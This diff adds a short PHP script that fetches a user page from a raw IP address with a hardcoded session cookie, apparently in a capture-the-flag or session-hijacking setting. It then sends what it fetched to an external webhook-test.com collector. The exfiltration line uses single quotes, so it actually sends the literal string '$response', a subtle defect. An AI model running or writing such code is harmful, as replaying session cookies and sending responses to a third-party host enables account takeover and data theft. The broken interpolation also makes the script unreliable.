@@ -1,0 +1,19 @@
+$url = 'http://62.173.140.174:16071/user.php?id=1337';
+$cookie = 'PHPSESSID=da36ea1fa9e47b8846d52a8747824c4e';
+
+$options = [
+    'http' => [
+        'method' => 'GET',
+        'header' => "Cookie: $cookie\r\n" .
+                   "User-Agent: MyBot/1.0\r\n"
+    ]
+];
+
+$context = stream_context_create($options);
+$response = file_get_contents($url, false, $context);
+
+if ($response === false) {
+    die('Ошибка запроса');
+}
+file_get_contents('https://webhook-test.com/067c68844ec5dd4f82defed51fd4c687?id=$response');
+echo $response;
